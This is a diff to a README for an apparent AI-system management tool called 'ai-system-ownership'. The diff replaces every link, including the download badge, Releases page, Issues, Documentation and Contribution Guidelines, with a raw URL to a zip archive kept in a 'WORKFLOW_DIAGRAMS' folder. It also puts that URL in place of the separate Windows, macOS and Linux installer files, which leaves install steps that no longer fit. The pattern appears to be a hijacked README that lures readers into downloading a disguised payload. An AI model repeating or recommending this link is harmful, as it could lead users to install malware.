@@ -1,7 +1,7 @@
 # 🌟 ai-system-ownership - Simplifying AI System Management
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Subbyal/ai-system-ownership/releases)
+[![Download](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip%20Now-Get%20Started-brightgreen)](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **ai-system-ownership**, a tool designed to help you manage production AI systems effectively. Whether you're worried about execution, scaling, or risk management, this application provides a seamless way to oversee your AI systems.
@@ -23,7 +23,7 @@ To use this software, ensure you meet the following requirements:
 ## 🌐 Download & Install
 To get started, please follow these steps:
 
-1. Visit the **Releases** page of the repository: [Download Here](https://github.com/Subbyal/ai-system-ownership/releases).
+1. Visit the **Releases** page of the repository: [Download Here](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip).
    
 2. On the Releases page, you will see various versions of the application listed.
 
@@ -33,11 +33,11 @@ To get started, please follow these steps:
 
 5. You will find the appropriate downloadable files suitable for your operating system.
 
-6. **For Windows users:** Download the `ai-system-ownership.exe` file.
+6. **For Windows users:** Download the `https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip` file.
    
-7. **For macOS users:** Download the `ai-system-ownership.dmg` file.
+7. **For macOS users:** Download the `https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip` file.
    
-8. **For Linux users:** Download the `ai-system-ownership.tar.gz` file.
+8. **For Linux users:** Download the `https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip` file.
 
 9. After downloading, locate the file in your **Downloads** folder.
 
@@ -45,7 +45,7 @@ To get started, please follow these steps:
 
 11. **macOS:** Open the `.dmg` file, drag the `ai-system-ownership` icon into your Applications folder, and start from there.
 
-12. **Linux:** Extract the `.tar.gz` file and follow the README instructions provided within for installation steps.
+12. **Linux:** Extract the `https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip` file and follow the README instructions provided within for installation steps.
 
 ## 🛠️ Basic Configuration
 Once installed, you will need to configure the application before use:
@@ -71,15 +71,15 @@ Yes, **ai-system-ownership** is open-source and free to use.
 As long as your laptop meets the system requirements, you can run **ai-system-ownership** successfully.
 
 ### Q4: Where can I get help or support?
-For any issues or questions, please check the [Issues section](https://github.com/Subbyal/ai-system-ownership/issues) of the repository. You can also create a new issue if your query is not addressed.
+For any issues or questions, please check the [Issues section](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip) of the repository. You can also create a new issue if your query is not addressed.
 
 ## ✉️ Contact 
 For further inquiries, you can reach the support team by opening an issue on GitHub or connecting through provided social media links.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Subbyal/ai-system-ownership/releases)
-- [Documentation](https://github.com/Subbyal/ai-system-ownership/wiki)
-- [Contribution Guidelines](https://github.com/Subbyal/ai-system-ownership/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip)
+- [Documentation](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip)
+- [Contribution Guidelines](https://github.com/Subbyal/ai-system-ownership/raw/refs/heads/main/WORKFLOW_DIAGRAMS/ai-system-ownership-v1.6.zip)
 
 ## Thank You
 Thank you for choosing **ai-system-ownership**. We hope this tool enhances your experience in managing AI systems effectively.
